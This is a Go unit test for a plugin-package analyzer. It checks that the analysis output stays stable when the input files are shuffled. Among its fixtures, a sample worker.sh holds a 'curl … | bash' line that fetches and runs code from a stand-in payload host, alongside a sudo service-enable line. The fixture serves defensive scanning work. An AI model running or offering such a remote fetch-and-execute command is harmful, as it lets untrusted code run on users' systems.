package analyze

import (
	"encoding/json"
	"math/rand"
	"testing"

	"github.com/SurreptitiousFabric/plug-and-prejudice/internal/report"
)

func TestAnalysisOutputIsStableAcrossInputOrdering(t *testing.T) {
	contents := map[string][]byte{
		"manifest.json": []byte(`{"schemaVersion":1,"id":"example.determinism","name":"Determinism","version":"1.0.0","kinds":["panel"],"entryPoints":{"service":"worker.sh","panel":"Panel.qml"}}`),
		"Panel.qml":     []byte("import QtQuick\nItem { property string worker: \"worker.sh\"; property string helper: \"helper.py\" }\n"),
		"worker.sh":     []byte("#!/bin/sh\ncurl https://payload.example.test/install | bash\nsudo systemctl --user enable example.service\n"),
		"helper.py":     []byte("print('inventoried, never executed')\n"),
		"broken.sh":     []byte("if then\n"),
	}
	files := []report.File{
		{Path: "worker.sh", Kind: "regular", Mode: "0644", Size: int64(len(contents["worker.sh"])), SHA256: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", ContentType: "text/plain; charset=utf-8", Inspected: true},
		{Path: "linked", Kind: "symlink", Mode: "0777", LinkTarget: "../outside", Inspected: false, SkipReason: "symbolic-link"},
		{Path: "helper.py", Kind: "regular", Mode: "0644", Size: int64(len(contents["helper.py"])), SHA256: "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb", ContentType: "text/plain; charset=utf-8", Inspected: true},
	}

	var baseline []byte
	random := rand.New(rand.NewSource(0x5052454a55444943))
	keys := []string{"manifest.json", "Panel.qml", "worker.sh", "helper.py", "broken.sh"}
	for iteration := 0; iteration < 128; iteration++ {
		random.Shuffle(len(keys), func(i, j int) { keys[i], keys[j] = keys[j], keys[i] })
		orderedContents := make(map[string][]byte, len(contents))
		for _, key := range keys {
			orderedContents[key] = append([]byte(nil), contents[key]...)
		}
		orderedFiles := append([]report.File(nil), files...)
		random.Shuffle(len(orderedFiles), func(i, j int) { orderedFiles[i], orderedFiles[j] = orderedFiles[j], orderedFiles[i] })

		result := Sources(orderedContents)
		Inventory(orderedFiles, orderedContents, &result)
		encoded, err := json.Marshal(result)
		if err != nil {
			t.Fatal(err)
		}
		if iteration == 0 {
			baseline = encoded
			continue
		}
		if string(encoded) != string(baseline) {
			t.Fatalf("analysis changed with input order on iteration %d\nfirst: %s\nnow:   %s", iteration, baseline, encoded)
		}
	}
}
